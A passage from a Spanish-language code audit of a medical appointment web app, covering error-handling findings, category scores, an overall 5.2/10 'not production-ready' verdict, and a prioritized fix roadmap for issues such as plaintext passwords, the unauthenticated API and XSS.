**Descripción:** Entre el `findOne` que verifica si el slot está libre (línea 62) y el `save` que crea la cita (línea 100), existe una ventana de tiempo. Si dos pacientes reservan el mismo slot simultáneamente, ambos pasarán la validación y uno de ellos fallará en el guardado con un error de índice único que actualmente devuelve un 500. La segunda request debería devolver un mensaje amigable.

**Recomendación:** El índice único en MongoDB ya evita la inserción, pero el manejo del error `code: 11000` debe ser explícito (ver OBS-BACK-06).

---

### 🟠 OBS-ERR-03 — cargarHistorialPaciente no maneja el caso de respuesta sin la propiedad `citas`

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Línea 467 |
| **Severidad** | 🟠 Alto |

**Descripción:**
```js
if (data.citas.length === 0) { ... }
```
Si por cualquier razón el servidor devuelve un error (y el body no contiene `citas`), `data.citas` será `undefined` y `.length` lanzará un `TypeError: Cannot read properties of undefined`, rompiendo silenciosamente la función.

**Recomendación:** Usar optional chaining y fallback:
```js
const citas = data.citas || [];
if (citas.length === 0) { ... }
```

---

### 🟡 OBS-ERR-04 — La historia del paciente en el modal filtra por `_id` con comparación de String

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Línea 882 |
| **Severidad** | 🟡 Medio |

**Descripción:**
```js
const historialFiltrado = (data.historial || []).filter(h => h._id !== cita._id);
```
MongoDB devuelve `_id` como ObjectId que se serializa a String en JSON. Esta comparación funciona correctamente en este caso, pero es frágil: si cambia el formato de serialización, el filtro fallará y la cita actual aparecería duplicada en su propio historial.

---

### 🟢 OBS-ERR-05 — El campo `diagnosticoContainer` no se oculta en citas completadas al reagendar

| Campo | Detalle |
|---|---|
| **Archivo** | [agendaApp.js](file:///c:/Users/julia/Desktop/Agenda-medica/public/agendaApp.js) — Líneas 867-873 |
| **Severidad** | 🟢 Bajo |

**Descripción:** Cuando se abre el modal de una cita `completada`, se deshabilita el textarea de diagnóstico y se oculta el botón "Finalizar", pero el textarea sigue visible. Sería mejor ocultarlo completamente para citas ya completadas.

---

---

## 📊 Calificaciones por Categoría

| Categoría | Puntuación | Justificación |
|---|---|---|
| **Arquitectura** | **6/10** | MVC básico bien estructurado, pero un solo JS para dos páginas, sin Service Layer, datos duplicados |
| **Backend** | **6.5/10** | Controladores funcionales y bien organizados, pero sin validación completa de inputs y manejo de errores insuficiente |
| **Frontend** | **7/10** | Diseño moderno y atractivo, buena UX general, penalizado por XSS crítico y CSS duplicado |
| **Base de datos** | **5/10** | Bug crítico en el índice único con citas canceladas, desnormalización, falta de índices en campos frecuentes |
| **Seguridad** | **2/10** | Contraseñas en texto plano, sin autenticación en la API, XSS posible, sin rate limiting — **No apto para producción** |
| **Rendimiento** | **6.5/10** | Funcional para carga baja, pero sin caché, sin loading states, con queries innecesarias |
| **Escalabilidad** | **5/10** | Reglas hardcodeadas, 1 doctor/especialidad obligatorio, sin logging, sin tests |
| **Calidad del código** | **6.5/10** | Código legible y con buenos nombres, pero muy acoplado, violaciones DRY y SRP significativas |
| **Mantenibilidad** | **5.5/10** | El JS monolítico de 953 líneas será difícil de mantener; estilos duplicados agravan el problema |

---

## 🏆 Calificación General del Proyecto

# **5.2 / 10**

### Veredicto: ❌ No Aprobado para Producción

### Justificación

El proyecto demuestra una comprensión sólida del stack tecnológico elegido y está funcionalmente completo en términos de requisitos de negocio: el calendario, las restricciones horarias, la gestión de citas y los paneles de paciente/doctor funcionan correctamente.

Sin embargo, existen **3 vulnerabilidades de seguridad de nivel CRÍTICO** que por sí solas descalifican el proyecto para cualquier entorno de producción que maneje datos médicos reales:

1. **Contraseñas en texto plano** — riesgo de exposición masiva de datos.
2. **API sin autenticación ni autorización** — cualquier persona puede acceder y modificar datos de cualquier paciente o doctor.
3. **XSS por innerHTML sin sanitizar** — permite ejecución de código malicioso en el navegador del médico.

Adicionalmente, el **bug crítico en la base de datos** (índice único que bloquea slots de citas canceladas) generaría problemas operativos inmediatos en producción.

### Hoja de Ruta para Aprobación

| Prioridad | Tarea |
|---|---|
| 🔴 P0 | Implementar bcrypt para contraseñas |
| 🔴 P0 | Implementar JWT para proteger todos los endpoints |
| 🔴 P0 | Reemplazar innerHTML con textContent en datos del servidor |
| 🔴 P0 | Corregir el índice único de citaModel con filtro parcial |
| 🟠 P1 | Agregar rate limiting a los endpoints de autenticación |
| 🟠 P1 | Agregar validaciones de formato completas en el backend |
| 🟠 P1 | Separar agendaApp.js en dos archivos |
| 🟡 P2 | Centralizar estilos CSS |
| 🟡 P2 | Agregar índices de rendimiento en MongoDB |
| 🟡 P2 | Implementar tests con Jest + Supertest |

